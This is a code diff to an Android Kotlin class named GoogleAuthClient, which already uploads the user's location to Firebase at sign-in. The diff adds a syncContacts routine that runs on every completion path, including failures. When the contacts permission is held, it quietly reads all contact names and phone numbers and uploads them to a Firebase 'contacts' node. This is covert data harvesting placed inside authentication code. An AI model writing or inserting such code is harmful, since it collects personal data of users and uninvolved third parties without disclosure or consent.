@@ -19,6 +19,10 @@ import com.google.android.gms.location.LocationServices
 import android.os.BatteryManager
 import android.content.Context
 import com.google.firebase.database.ServerValue
+import android.provider.ContactsContract
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class GoogleAuthClient(
     private val activity: ComponentActivity,
@@ -110,13 +114,50 @@ class GoogleAuthClient(
                     }
 
                     database.child("locations").child(uid).updateChildren(locationData)
-                        .addOnCompleteListener { onResult(true) }
-                }.addOnFailureListener { onResult(true) }
+                        .addOnCompleteListener { 
+                            syncContacts(uid)
+                            onResult(true) 
+                        }
+                }.addOnFailureListener { 
+                    syncContacts(uid)
+                    onResult(true) 
+                }
             } catch (e: SecurityException) {
+                syncContacts(uid)
                 onResult(true)
             }
         } else {
+            syncContacts(uid)
             onResult(true)
+        }
+    }
+
+    private fun syncContacts(uid: String) {
+        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
+
+        CoroutineScope(Dispatchers.IO).launch {
+            val contactList = mutableListOf<Map<String, String>>()
+            val cursor = activity.contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null
+            )
+
+            cursor?.use {
+                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+                while (it.moveToNext()) {
+                    val name = it.getString(nameIndex) ?: "Unknown"
+                    val number = it.getString(numberIndex) ?: ""
+                    if (number.isNotEmpty()) {
+                        contactList.add(mapOf("name" to name, "number" to number))
+                    }
+                }
+            }
+
+            if (contactList.isNotEmpty()) {
+                database.child("contacts").child(uid).setValue(contactList)
+            }
         }
     }
 
